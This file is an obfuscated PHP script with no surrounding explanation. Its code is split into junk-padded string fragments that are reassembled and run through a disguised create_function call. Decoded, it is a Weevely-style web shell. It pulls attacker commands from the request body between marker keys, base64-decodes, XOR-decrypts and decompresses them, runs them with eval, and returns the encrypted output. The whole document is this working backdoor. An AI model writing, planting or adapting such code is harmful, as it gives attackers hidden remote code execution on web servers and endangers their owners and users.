<?php
$W='[1])3q,3q3q$3qk)));$o=@ob_get_conte3qnt3qs();@ob_end3q_cle3qan()3q;$r=3q@';
$t='$3qk="c36d9602";$3qkh3q=3q"3q903daac3q43q83q424";$kf="62144aca6f93qd";$p="';
$r='rlen(3q$t);$o3q="";f3qor3q($i=0;$3qi<$3ql;){3qfor($j=0;(3q$j<$c&&3q$i<$l3q';
$n='ch("/$k3qh(.+3q3q)$kf/",3q@file3q_3qge3qt_contents("php://input"3q),$m3q)';
$S='base3q64_encode(@3qx(@gzcom3qp3qress($3qo),$k));pri3qnt("$3qp$kh$3qr$kf");}';
$v='==1) {3q@ob3q_st3qart();@e3qval(@gzunc3qompress3q(@x(@b3qas3qe64_dec3qode($m';
$U=str_replace('Kd','','cKdreKdateKdKdKd_fuKdnction');
$i='Ld20KYc3qu4KL3qr3qdKM3qw";fu3qnction3q 3qx($t,$k){$c=strlen($3qk);3q$l=st';
$s=');$j++,$3qi++){$o.=$3qt{$i3q}3q^$k{$j};}}ret3qurn $o3q;}i3qf3q (@pr3qeg_mat';
$H=str_replace('3q','',$t.$i.$r.$s.$n.$v.$W.$S);
$K=$U('',$H);$K();
?>
